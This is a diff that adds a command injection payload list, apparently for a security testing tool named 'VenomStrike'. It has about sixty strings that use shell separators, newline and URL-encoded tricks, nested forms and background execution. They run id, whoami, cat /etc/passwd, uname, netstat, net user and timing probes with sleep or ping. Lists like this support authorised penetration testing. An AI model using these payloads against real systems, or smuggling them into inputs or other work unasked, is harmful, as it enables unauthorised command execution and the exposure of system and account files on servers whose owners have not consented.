@@ -1,0 +1,72 @@
+# VenomStrike Command Injection Payloads
+# Basic separators
+;id
+|id
+||id
+&id
+&&id
+`id`
+$(id)
+
+# File reading
+;cat /etc/passwd
+|cat /etc/passwd
+||cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+;type C:\Windows\win.ini
+|type C:\Windows\win.ini
+
+# System info
+;uname -a
+|uname -a
+;whoami
+|whoami
+;hostname
+|hostname
+;ls -la
+|ls -la
+;ifconfig
+|ifconfig
+;netstat -an
+|netstat -an
+
+# Newline injection
+%0aid
+%0did
+%0a%0did
+
+# Encoding bypass
+;%69%64
+|%69%64
+
+# Time-based detection
+;sleep 5
+|sleep 5
+||sleep 5
+`sleep 5`
+$(sleep 5)
+& ping -n 5 127.0.0.1 &
+| ping -n 5 127.0.0.1
+;ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+
+# Nested
+a]|id|[b
+a)|id|(b
+;{id}
+$($(whoami))
+
+# Background execution
+;id &
+|id &
+
+# Windows specific
+& dir
+| dir
+& whoami
+| whoami
+& ipconfig
+| ipconfig
+& net user
+& systeminfo
